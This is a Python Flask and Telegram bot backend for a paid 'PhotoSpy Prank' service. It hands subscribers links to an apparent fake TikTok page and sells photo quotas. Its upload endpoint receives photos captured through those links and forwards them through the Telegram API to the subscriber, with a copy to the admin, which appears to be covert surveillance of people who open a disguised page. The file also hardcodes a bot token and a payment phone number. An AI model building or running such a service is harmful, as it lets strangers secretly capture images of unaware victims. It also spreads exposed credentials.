import sqlite3
import datetime
import uuid
import time
import json
import threading
import requests
from flask import Flask, request, jsonify

# ======================================================
#  КОНФИГ
# ======================================================
BOT_TOKEN = "8305233302:AAGsmlkthj6VKmsixKTBedvJthAMrQ39dxI"
BASE_URL = "https://nomadru.github.io/tiktokfake"
ADMIN_CHAT_ID = 8533142719
FREE_TRIAL_PHOTOS = 2
ADMIN_USERNAME = "pytin_legend"
PAYMENT_PHONE = "+79278880124"

TARIFFS = [
    {"photos": 1,  "price": 5},
    {"photos": 10, "price": 30},
    {"photos": 100, "price": 250}
]

# ======================================================
#  БАЗА ДАННЫХ
# ======================================================
def init_db():
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            chat_id INTEGER PRIMARY KEY,
            ref TEXT UNIQUE,
            subscription_end TEXT,
            photos_limit INTEGER,
            used_photos INTEGER DEFAULT 0,
            tariff_name TEXT,
            referrer_id INTEGER DEFAULT NULL,
            referral_count INTEGER DEFAULT 0
        )
    ''')
    c.execute('''
        CREATE TABLE IF NOT EXISTS pending_payments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            chat_id INTEGER,
            ref TEXT,
            photos INTEGER,
            price INTEGER,
            status TEXT DEFAULT 'pending',
            created_at TEXT
        )
    ''')
    conn.commit()
    conn.close()

def add_user(chat_id, ref, end_date, limit, tariff, referrer_id=None):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('''
        INSERT OR REPLACE INTO users (chat_id, ref, subscription_end, photos_limit, used_photos, tariff_name, referrer_id, referral_count)
        VALUES (?, ?, ?, ?, 0, ?, ?, 0)
    ''', (chat_id, ref, end_date, limit, tariff, referrer_id))
    conn.commit()
    conn.close()

def get_user(chat_id):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('SELECT ref, subscription_end, photos_limit, used_photos, referrer_id, referral_count FROM users WHERE chat_id=?', (chat_id,))
    row = c.fetchone()
    conn.close()
    return row

def get_user_by_ref(ref):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('SELECT chat_id, subscription_end, photos_limit, used_photos, referrer_id FROM users WHERE ref=?', (ref,))
    row = c.fetchone()
    conn.close()
    return row

def update_user_limit(chat_id, new_limit):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('UPDATE users SET photos_limit = ? WHERE chat_id = ?', (new_limit, chat_id))
    conn.commit()
    conn.close()

def increment_used_photos(ref):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('UPDATE users SET used_photos = used_photos + 1 WHERE ref=?', (ref,))
    conn.commit()
    conn.close()

def get_all_users():
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('SELECT chat_id, ref, photos_limit, used_photos, subscription_end, referral_count FROM users')
    rows = c.fetchall()
    conn.close()
    return rows

def increment_referral_count(chat_id):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('UPDATE users SET referral_count = referral_count + 1 WHERE chat_id = ?', (chat_id,))
    conn.commit()
    conn.close()

def add_pending_payment(chat_id, ref, photos, price):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('''
        INSERT INTO pending_payments (chat_id, ref, photos, price, status, created_at)
        VALUES (?, ?, ?, ?, 'pending', ?)
    ''', (chat_id, ref, photos, price, datetime.datetime.now().isoformat()))
    conn.commit()
    conn.close()

def get_pending_payments():
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('SELECT id, chat_id, ref, photos, price, created_at FROM pending_payments WHERE status="pending" ORDER BY created_at DESC')
    rows = c.fetchall()
    conn.close()
    return rows

def get_payment_by_id(payment_id):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('SELECT id, chat_id, ref, photos, price FROM pending_payments WHERE id=?', (payment_id,))
    row = c.fetchone()
    conn.close()
    return row

def update_payment_status(payment_id, status):
    conn = sqlite3.connect('db.sqlite')
    c = conn.cursor()
    c.execute('UPDATE pending_payments SET status=? WHERE id=?', (status, payment_id))
    conn.commit()
    conn.close()

# ======================================================
#  ОТПРАВКА СООБЩЕНИЙ
# ======================================================
def send_message(chat_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    requests.post(url, json=data)

def edit_message(chat_id, message_id, text, reply_markup=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
    data = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": "HTML"}
    if reply_markup:
        data["reply_markup"] = json.dumps(reply_markup)
    requests.post(url, json=data)

def answer_callback(callback_id, text=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
    data = {"callback_query_id": callback_id}
    if text:
        data["text"] = text
    requests.post(url, json=data)

# ======================================================
#  КЛАВИАТУРЫ
# ======================================================
def main_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "🔗 Получить ссылку", "callback_data": "get_link"}],
            [{"text": "📊 Моя подписка", "callback_data": "my_sub"}],
            [{"text": "💰 Купить фото", "callback_data": "buy_photo"}],
            [{"text": "👥 Пригласить друга", "callback_data": "invite"}],
            [{"text": "📈 Мои рефералы", "callback_data": "my_refs"}]
        ]
    }

def back_keyboard():
    return {"inline_keyboard": [[{"text": "🔙 Назад", "callback_data": "back"}]]}

def tariffs_keyboard():
    kb = {"inline_keyboard": []}
    for t in TARIFFS:
        kb["inline_keyboard"].append([
            {"text": f"{t['photos']} фото – {t['price']} руб", "callback_data": f"tariff_{t['photos']}_{t['price']}"}
        ])
    kb["inline_keyboard"].append([{"text": "🔙 Назад", "callback_data": "back"}])
    return kb

# ======================================================
#  АДМИН-КЛАВИАТУРЫ
# ======================================================
def admin_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "👥 Пользователи", "callback_data": "admin_users"}],
            [{"text": "💳 Платежи", "callback_data": "admin_payments"}],
            [{"text": "➕ Добавить фото", "callback_data": "admin_add_help"}],
            [{"text": "📊 Статистика", "callback_data": "admin_stats"}],
            [{"text": "🔙 Выход", "callback_data": "admin_exit"}]
        ]
    }

def admin_payments_keyboard(payments):
    kb = {"inline_keyboard": []}
    for p in payments:
        pid, pchat, pref, pphotos, pprice, pcreated = p
        kb["inline_keyboard"].append([
            {"text": f"✅ {pref} ({pphotos} фото, {pprice}₽)", "callback_data": f"admin_confirm_{pid}"},
            {"text": "❌", "callback_data": f"admin_reject_{pid}"}
        ])
    kb["inline_keyboard"].append([{"text": "🔙 Назад", "callback_data": "admin_menu"}])
    return kb

# ======================================================
#  ОБРАБОТЧИКИ ЮЗЕРА
# ======================================================
def handle_start(chat_id, text=None):
    referrer_id = None
    if text and text.startswith("/start ref_"):
        try:
            referrer_id = int(text.split("_")[1])
        except:
            pass

    row = get_user(chat_id)
    if not row:
        ref = str(uuid.uuid4())[:8]
        end_date = (datetime.datetime.now() + datetime.timedelta(days=365)).isoformat()
        add_user(chat_id, ref, end_date, FREE_TRIAL_PHOTOS, "Тестовый", referrer_id)

        if referrer_id:
            referrer_data = get_user(referrer_id)
            if referrer_data:
                ref_ref, end, limit, used, _, _ = referrer_data
                new_limit = limit + 1
                update_user_limit(referrer_id, new_limit)
                increment_referral_count(referrer_id)
                send_message(referrer_id, f"🎉 Твой друг перешёл по ссылке! Тебе начислено +1 фото. Новый лимит: {new_limit}")

        link = f"{BASE_URL}?ref={ref}"
        send_message(chat_id,
            f"🎉 Добро пожаловать в <b>ФотоШпион Пранк Бот</b>!\n\n"
            f"Ты получил <b>{FREE_TRIAL_PHOTOS} тестовых фото</b> бесплатно!\n"
            f"Твоя ссылка:\n<code>{link}</code>\n\n"
            f"После теста — купи фото через меню.",
            reply_markup=main_keyboard()
        )
    else:
        send_message(chat_id, "👋 С возвращением!\n\nВыбери действие:", reply_markup=main_keyboard())

def handle_callback(chat_id, callback_id, data, message_id=None):
    # ===== АДМИН-КОЛБЭКИ (только для админа) =====
    if data.startswith("admin_") and chat_id == ADMIN_CHAT_ID:
        if data == "admin_menu":
            send_message(chat_id, "🛠 <b>Админ-панель</b>\n\nВыбери действие:", reply_markup=admin_keyboard())
            answer_callback(callback_id)
            return

        elif data == "admin_users":
            users = get_all_users()
            if not users:
                send_message(chat_id, "📭 Нет пользователей", reply_markup=admin_keyboard())
                answer_callback(callback_id)
                return
            msg = "👥 <b>Пользователи:</b>\n\n"
            for u in users[:30]:  # первые 30
                uchat, ref, limit, used, end, refc = u
                remaining = limit - used
                msg += f"<code>{ref}</code> — осталось {remaining} (всего {limit}), реф: {refc}\n"
            send_message(chat_id, msg, reply_markup=admin_keyboard())
            answer_callback(callback_id)
            return

        elif data == "admin_payments":
            payments = get_pending_payments()
            if not payments:
                send_message(chat_id, "💳 Нет ожидающих платежей.", reply_markup=admin_keyboard())
                answer_callback(callback_id)
                return
            send_message(chat_id, "💳 <b>Ожидающие платежи:</b>\nНажми ✅ для подтверждения или ❌ для отклонения.",
                         reply_markup=admin_payments_keyboard(payments))
            answer_callback(callback_id)
            return

        elif data == "admin_stats":
            users = get_all_users()
            total_users = len(users)
            total_photos = sum(u[2] for u in users)
            payments = get_pending_payments()
            msg = (
                f"📊 <b>Статистика</b>\n\n"
                f"• Всего пользователей: {total_users}\n"
                f"• Всего куплено фото: {total_photos}\n"
                f"• Ожидающих платежей: {len(payments)}"
            )
            send_message(chat_id, msg, reply_markup=admin_keyboard())
            answer_callback(callback_id)
            return

        elif data == "admin_add_help":
            send_message(chat_id,
                "➕ <b>Добавить фото вручную</b>\n\n"
                "Отправь команду:\n"
                "<code>/addphotos ref_xxxxx 5</code>\n\n"
                "Где <code>ref_xxxxx</code> — реф-код пользователя, 5 — сколько фото добавить.",
                reply_markup=admin_keyboard())
            answer_callback(callback_id)
            return

        elif data.startswith("admin_confirm_"):
            payment_id = int(data.replace("admin_confirm_", ""))
            row = get_payment_by_id(payment_id)
            if not row:
                answer_callback(callback_id, "Платёж не найден")
                return
            pid, pchat, pref, pphotos, pprice = row
            user = get_user_by_ref(pref)
            if user:
                uchat, end, limit, used, _ = user
                new_limit = limit + pphotos
                update_user_limit(uchat, new_limit)
                send_message(uchat, f"✅ Платёж подтверждён! Начислено {pphotos} фото. Новый лимит: {new_limit}")
            update_payment_status(pid, 'confirmed')
            answer_callback(callback_id, "✅ Подтверждено")
            # Обновим список платежей
            payments = get_pending_payments()
            if payments:
                edit_message(chat_id, message_id, "💳 <b>Ожидающие платежи:</b>", reply_markup=admin_payments_keyboard(payments))
            else:
                edit_message(chat_id, message_id, "💳 Нет ожидающих платежей.", reply_markup=admin_keyboard())
            return

        elif data.startswith("admin_reject_"):
            payment_id = int(data.replace("admin_reject_", ""))
            row = get_payment_by_id(payment_id)
            if not row:
                answer_callback(callback_id, "Платёж не найден")
                return
            pid, pchat, pref, pphotos, pprice = row
            send_message(pchat, "❌ Ваш платёж отклонён. Свяжитесь с админом.")
            update_payment_status(pid, 'rejected')
            answer_callback(callback_id, "❌ Отклонено")
            payments = get_pending_payments()
            if payments:
                edit_message(chat_id, message_id, "💳 <b>Ожидающие платежи:</b>", reply_markup=admin_payments_keyboard(payments))
            else:
                edit_message(chat_id, message_id, "💳 Нет ожидающих платежей.", reply_markup=admin_keyboard())
            return

        elif data == "admin_exit":
            send_message(chat_id, "Вы вышли из админ-панели. Возвращайся командой /admin")
            answer_callback(callback_id)
            return

    # ===== ОБЫЧНЫЕ КОЛБЭКИ =====
    if data == "get_link":
        row = get_user(chat_id)
        if not row:
            send_message(chat_id, "Сначала активируй подписку (напиши /start).", reply_markup=main_keyboard())
            answer_callback(callback_id)
            return
        ref, end_date, limit, used, _, _ = row
        remaining = limit - used
        if remaining <= 0:
            send_message(chat_id, "❌ У тебя закончились фото. Купи новые через меню.", reply_markup=main_keyboard())
            answer_callback(callback_id)
            return
        link = f"{BASE_URL}?ref={ref}"
        send_message(chat_id,
            f"🔗 Твоя ссылка:\n<code>{link}</code>\n\nОсталось фото: {remaining}",
            reply_markup=back_keyboard()
        )
        answer_callback(callback_id)

    elif data == "my_sub":
        row = get_user(chat_id)
        if not row:
            send_message(chat_id, "У тебя нет активной подписки. Напиши /start", reply_markup=main_keyboard())
            answer_callback(callback_id)
            return
        ref, end_date, limit, used, _, referral_count = row
        remaining = limit - used
        status = "✅ Активна" if remaining > 0 else "❌ Исчерпана"
        text = (
            f"📊 <b>Твоя подписка</b>\n\n"
            f"• Статус: {status}\n"
            f"• Осталось фото: {remaining}\n"
            f"• Всего фото: {limit}\n"
            f"• Использовано: {used}\n"
            f"• Реф-код: <code>{ref}</code>\n"
            f"• Привёл друзей: {referral_count}"
        )
        send_message(chat_id, text, reply_markup=back_keyboard())
        answer_callback(callback_id)

    elif data == "buy_photo":
        send_message(chat_id, "📸 Выбери тариф:", reply_markup=tariffs_keyboard())
        answer_callback(callback_id)

    elif data.startswith("tariff_"):
        parts = data.split("_")
        photos = int(parts[1])
        price = int(parts[2])
        ref = get_user(chat_id)[0]
        send_message(chat_id,
            f"💳 Для покупки <b>{photos} фото</b> переведи <b>{price} руб</b> на номер <b>{PAYMENT_PHONE}</b> (СБП).\n\n"
            f"В назначении платежа укажи свой ref-код: <code>{ref}</code>\n\n"
            f"После перевода нажми кнопку «Я оплатил» и прикрепи чек.",
            reply_markup={"inline_keyboard": [
                [{"text": "✅ Я оплатил", "callback_data": f"pay_confirmed_{photos}_{price}"}],
                [{"text": "🔙 Назад", "callback_data": "back"}]
            ]}
        )
        answer_callback(callback_id)

    elif data.startswith("pay_confirmed_"):
        parts = data.split("_")
        photos = int(parts[2])
        price = int(parts[3])
        ref = get_user(chat_id)[0]
        add_pending_payment(chat_id, ref, photos, price)
        send_message(chat_id,
            f"📩 Отправь сюда <b>скриншот чека</b>.\n"
            f"После проверки админ начислит фото."
        )
        answer_callback(callback_id)

    elif data == "invite":
        row = get_user(chat_id)
        if not row:
            send_message(chat_id, "Сначала напиши /start.", reply_markup=main_keyboard())
            answer_callback(callback_id)
            return
        ref_link = f"https://t.me/твой_бот?start=ref_{chat_id}"
        send_message(chat_id,
            f"👥 Пригласи друга по этой ссылке:\n<code>{ref_link}</code>\n\n"
            f"Когда друг перейдёт и сделает первое фото — ты получишь <b>+1 фото</b> на баланс!",
            reply_markup={"inline_keyboard": [[{"text": "📋 Скопировать", "url": ref_link}]]}
        )
        answer_callback(callback_id)

    elif data == "my_refs":
        row = get_user(chat_id)
        if not row:
            send_message(chat_id, "Сначала напиши /start.", reply_markup=main_keyboard())
            answer_callback(callback_id)
            return
        ref, end_date, limit, used, _, referral_count = row
        text = (
            f"📈 <b>Твои рефералы</b>\n\n"
            f"• Приглашено друзей: {referral_count}\n"
            f"• Бонусных фото получено: {referral_count}"
        )
        send_message(chat_id, text, reply_markup=back_keyboard())
        answer_callback(callback_id)

    elif data == "back":
        send_message(chat_id, "Главное меню:", reply_markup=main_keyboard())
        answer_callback(callback_id)

# ======================================================
#  АДМИН-КОМАНДЫ
# ======================================================
def handle_admin_command(chat_id, text):
    if chat_id != ADMIN_CHAT_ID:
        return False
    parts = text.split()
    cmd = parts[0].lower()

    if cmd == "/admin":
        send_message(chat_id, "🛠 <b>Админ-панель</b>\n\nВыбери действие:", reply_markup=admin_keyboard())
        return True

    elif cmd == "/addphotos":
        if len(parts) < 3:
            send_message(chat_id, "❌ Используй: /addphotos <ref> <количество>")
            return True
        ref = parts[1]
        try:
            add_count = int(parts[2])
        except:
            send_message(chat_id, "❌ Количество должно быть числом")
            return True
        user = get_user_by_ref(ref)
        if not user:
            send_message(chat_id, f"❌ Пользователь с ref {ref} не найден")
            return True
        uchat, end, old_limit, used, _ = user
        new_limit = old_limit + add_count
        update_user_limit(uchat, new_limit)
        send_message(chat_id, f"✅ Добавлено {add_count} фото для {ref}. Новый лимит: {new_limit}")
        send_message(uchat, f"✅ Админ добавил тебе {add_count} фото. Новый лимит: {new_limit}")
        return True

    elif cmd == "/listusers":
        users = get_all_users()
        if not users:
            send_message(chat_id, "📭 Нет пользователей")
            return True
        msg = "📋 <b>Список пользователей:</b>\n\n"
        for u in users:
            uchat, ref, limit, used, end, refc = u
            remaining = limit - used
            msg += f"• <code>{ref}</code> | осталось: {remaining} | всего: {limit} | реф: {refc}\n"
        send_message(chat_id, msg)
        return True

    elif cmd == "/info":
        if len(parts) < 2:
            send_message(chat_id, "❌ Используй: /info <ref>")
            return True
        ref = parts[1]
        user = get_user_by_ref(ref)
        if not user:
            send_message(chat_id, f"❌ Пользователь с ref {ref} не найден")
            return True
        uchat, end_date, limit, used, _ = user
        remaining = limit - used
        send_message(chat_id,
            f"📊 <b>Информация о {ref}</b>\n\n"
            f"• Chat ID: {uchat}\n"
            f"• Всего фото: {limit}\n"
            f"• Использовано: {used}\n"
            f"• Осталось: {remaining}\n"
            f"• Срок: {end_date}"
        )
        return True

    return False

# ======================================================
#  ОБРАБОТКА ЧЕКОВ
# ======================================================
def handle_photo_message(chat_id, file_id):
    file_url = f"https://api.telegram.org/bot{BOT_TOKEN}/getFile?file_id={file_id}"
    resp = requests.get(file_url)
    if resp.status_code != 200:
        send_message(chat_id, "❌ Ошибка при получении файла.")
        return
    file_path = resp.json().get("result", {}).get("file_path")
    if not file_path:
        send_message(chat_id, "❌ Не удалось получить файл.")
        return
    file_download = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
    photo_data = requests.get(file_download)
    files = {'photo': ('check.jpg', photo_data.content, 'image/jpeg')}
    data = {'chat_id': ADMIN_CHAT_ID, 'caption': f"💳 Чек от {chat_id}\nОткрой /admin → Платежи для подтверждения."}
    requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto", data=data, files=files)
    send_message(chat_id, "✅ Чек отправлен. Ожидай подтверждения.")

# ======================================================
#  БОТ-ПОЛЛИНГ
# ======================================================
def bot_polling():
    print("🤖 Бот запущен в фоне")
    last_update_id = 0
    while True:
        try:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
            params = {"offset": last_update_id + 1, "timeout": 30}
            resp = requests.get(url, params=params, timeout=35)
            if resp.status_code != 200:
                time.sleep(5)
                continue
            updates = resp.json().get("result", [])
            for upd in updates:
                last_update_id = upd["update_id"]
                if "message" in upd:
                    msg = upd["message"]
                    chat_id = msg["chat"]["id"]
                    if "photo" in msg:
                        photo = msg["photo"][-1]
                        file_id = photo["file_id"]
                        handle_photo_message(chat_id, file_id)
                    if "text" in msg:
                        text = msg["text"]
                        if text.startswith("/start"):
                            handle_start(chat_id, text)
                        elif text.startswith("/"):
                            if not handle_admin_command(chat_id, text):
                                # Игнорируем другие команды для не-админа
                                pass
                if "callback_query" in upd:
                    cb = upd["callback_query"]
                    chat_id = cb["from"]["id"]
                    callback_id = cb["id"]
                    data = cb["data"]
                    message_id = cb["message"]["message_id"]
                    print(f"🔘 CALLBACK: chat_id={chat_id}, data={data}")
                    try:
                        handle_callback(chat_id, callback_id, data, message_id)
                    except Exception as e:
                        print(f"❌ Ошибка в handle_callback: {e}")
        except Exception as e:
            print("Ошибка бота:", e)
            time.sleep(5)

# ======================================================
#  FLASK (только приём фото)
# ======================================================
app = Flask(__name__)

@app.route('/upload', methods=['POST'])
def upload():
    ref = request.args.get('ref')
    if not ref:
        return jsonify({'error': 'Missing ref'}), 400
    if 'photo' not in request.files:
        return jsonify({'error': 'No photo'}), 400
    photo = request.files['photo']
    user = get_user_by_ref(ref)
    if not user:
        return jsonify({'error': 'Invalid ref'}), 403
    chat_id, end_date, limit, used, _ = user
    now = datetime.datetime.now()
    if now > datetime.datetime.fromisoformat(end_date):
        return jsonify({'error': 'Subscription expired'}), 403
    if used >= limit:
        return jsonify({'error': 'Limit exceeded'}), 403

    files = {'photo': (photo.filename, photo.stream, photo.mimetype)}
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
    data_user = {'chat_id': chat_id, 'caption': f"📸 Ваше фото (ref: {ref})"}
    resp_user = requests.post(url, data=data_user, files=files)
    if resp_user.status_code != 200:
        return jsonify({'error': 'Telegram send to user failed'}), 500

    photo.seek(0)
    files_copy = {'photo': (photo.filename, photo.stream, photo.mimetype)}
    data_admin = {'chat_id': ADMIN_CHAT_ID, 'caption': f"📸 Копия от {ref}"}
    requests.post(url, data=data_admin, files=files_copy)

    increment_used_photos(ref)
    return jsonify({'status': 'ok'})

# ======================================================
#  ЗАПУСК
# ======================================================
print("🚦 СТАРТ ПРИЛОЖЕНИЯ")
init_db()
print("🗄️ База данных инициализирована")

def start_bot():
    print("🚀 Запуск потока бота...")
    bot_polling()

bot_thread = threading.Thread(target=start_bot, daemon=True)
bot_thread.start()
print("🧵 Поток бота запущен")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
